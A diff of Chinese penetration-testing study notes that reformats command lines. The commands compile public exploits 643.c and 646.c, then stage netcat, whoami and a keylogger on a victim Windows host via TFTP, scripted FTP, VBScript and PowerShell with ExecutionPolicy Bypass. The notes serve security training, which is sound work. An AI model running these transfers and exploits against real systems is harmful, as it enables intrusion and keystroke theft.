@@ -600,10 +600,10 @@ service.msc，创建System服务进程
 </li>
 <li>646.c<ul>
 <li>Windows环境下编译</li>
-<li>apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64</li>
-<li>dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</li>
-<li>i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
-<li>wine sl.exe IP地址</li>
+<li><strong><code>🔺命令：apt-get install mingw32 ▲ 2019.12.16 更改为apt-get install mingw-w64</code></strong></li>
+<li><strong><code>🔺命令：dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</code></strong></li>
+<li><strong><code>🔺命令：i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exe</code></strong> ▲ 2019.12.16 更改为 i686-w64-mingw32-gcc 646.c -o s1.exe -lws2_32</li>
+<li><strong><code>🔺命令：wine sl.exe IP地址</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -614,7 +614,7 @@ service.msc，创建System服务进程
 <ul>
 <li>643.c<ul>
 <li>Linux环境下编译</li>
-<li>gcc 643.c -o 643</li>
+<li><strong><code>🔺命令：gcc 643.c -o 643</code></strong></li>
 <li>Shellcode，偏移量，IP地址需要被替换</li>
 </ul>
 </li>
@@ -695,10 +695,10 @@ window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光�
 <li>Win7、2008需要单独添加（作为操作系统组件单独添加）</li>
 <li>经常被边界防火墙过滤</li>
 <li>Kali<ul>
-<li>mkdir /tftp</li>
-<li>chown -R nobody /tftp（作为服务程序的权限，较低）</li>
-<li>cp /usr/share/windows-binaries/nc.exe /tftp/（拷贝需要上传文件）</li>
-<li>atftpd –daemon –port 69 /tftp（作为后端程序）</li>
+<li><strong><code>🔺命令：mkdir /tftp</code></strong></li>
+<li><strong><code>🔺命令：chown -R nobody /tftp</code></strong>（作为服务程序的权限，较低）</li>
+<li><strong><code>🔺命令：cp /usr/share/windows-binaries/nc.exe /tftp/</code></strong>（拷贝需要上传文件）</li>
+<li><strong><code>🔺命令：atftpd --daemon --port 69 /tftp</code></strong>（作为后端程序）</li>
 </ul>
 </li>
 </ul>
@@ -708,7 +708,7 @@ window xp安装ftp：appwiz.cpl → Add → IIS → FTP（可能需要安装光�
 <pre><code>需要把tftpd下所有文件，组属设置为nobody，才能被下载</code></pre></blockquote>
 <ul>
 <li>Windows<ul>
-<li>tftp -i IP地址 get nc.exe  ▲ 2019.12.17 XP系统无默认安装tftp</li>
+<li><strong><code>🔺命令：tftp -i IP地址 get nc.exe</code></strong>  ▲ 2019.12.17 XP系统无默认安装tftp</li>
 </ul>
 </li>
 </ul>
@@ -719,8 +719,8 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 <li><p>利用FTP传输文件</p>
 <ul>
 <li>Kali<ul>
-<li>apt-get install pure-ftpd</li>
-<li>./ftp.sh（ftp配置文件）</li>
+<li><strong><code>🔺命令：apt-get install pure-ftpd</code></strong></li>
+<li><strong><code>🔺命令：./ftp.sh</code></strong>（ftp配置文件）</li>
 </ul>
 </li>
 </ul>
@@ -730,14 +730,14 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 
 <ul>
 <li>Windows<ul>
-<li>echo open IP地址 21&gt;ftp.txt</li>
-<li>echo 用户&gt;&gt;ftp.txt</li>
-<li>echo 密码&gt;&gt;ftp.txt</li>
-<li>echo bin&gt;&gt;ftp.txt</li>
-<li>echo GET whoami.exe&gt;&gt;ftp.txt</li>
-<li>echo GET klogger.exe&gt;&gt;ftp.txt</li>
-<li>echo bye&gt;&gt;ftp.txt</li>
-<li>ftp -s:ftp.txt</li>
+<li><strong><code>🔺命令：echo open IP地址 21&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo 用户&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo 密码&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo bin&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo GET whoami.exe&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo GET klogger.exe&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：echo bye&gt;&gt;ftp.txt</code></strong></li>
+<li><strong><code>🔺命令：ftp -s:ftp.txt</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -747,9 +747,9 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 <li><p>使用VBSCRIPT传输文件</p>
 <ul>
 <li>Kali<ul>
-<li>service apache2 start</li>
-<li>cp /ftphome/whoami.exe</li>
-<li>cp /ftphome/whoami.exe</li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
+<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
 </ul>
 </li>
 <li>Windows<ul>
@@ -763,7 +763,7 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 
 <ul>
 <li>Windows  ▲ 2019.12.17 XP系统报错：Microsoft VBScript runtime error<ul>
-<li>cscript wget.vbs <a href="http://IP地址/whoami.exe" target="_blank" rel="noopener">http://IP地址/whoami.exe</a> w.exe</li>
+<li><strong><code>🔺命令：cscript wget.vbs http://IP地址/whoami.exe w.exe</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -771,9 +771,9 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 <li><p>使用POWERSHELL传输文件</p>
 <ul>
 <li>Kali <ul>
-<li>service apache2 start</li>
-<li>cd /var/www/html/</li>
-<li>cp /ftphome/whoami.exe</li>
+<li><strong><code>🔺命令：service apache2 start</code></strong></li>
+<li><strong><code>🔺命令：cd /var/www/html/</code></strong></li>
+<li><strong><code>🔺命令：cp /ftphome/whoami.exe</code></strong></li>
 </ul>
 </li>
 <li>Windows<ul>
@@ -787,7 +787,7 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 
 <ul>
 <li>Windows<ul>
-<li>powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</li>
+<li><strong><code>🔺命令：powershell.exe -ExecutionPolicy Bypass -NoLogo -Noninteractive -NoProfile -File Wget.ps1</code></strong></li>
 </ul>
 </li>
 </ul>
@@ -801,9 +801,9 @@ klogger.exe记录键盘敲击的字符</code></pre></blockquote>
 </ul>
 </li>
 <li>upx压缩文件（对传输文件进行压缩，在Kali下压缩）</li>
-<li>wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</li>
-<li>debug&lt;123.hex  ▲ 2019.12.17 Debug为unrecognizable</li>
-<li>copy 1.dll nc.exe</li>
+<li><strong><code>🔺命令：wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt</code></strong></li>
+<li><strong><code>🔺命令：debug&lt;123.hex</code></strong>  ▲ 2019.12.17 Debug为unrecognizable</li>
+<li><strong><code>🔺命令：copy 1.dll nc.exe</code></strong></li>
 </ul>
 </li>
 </ol>
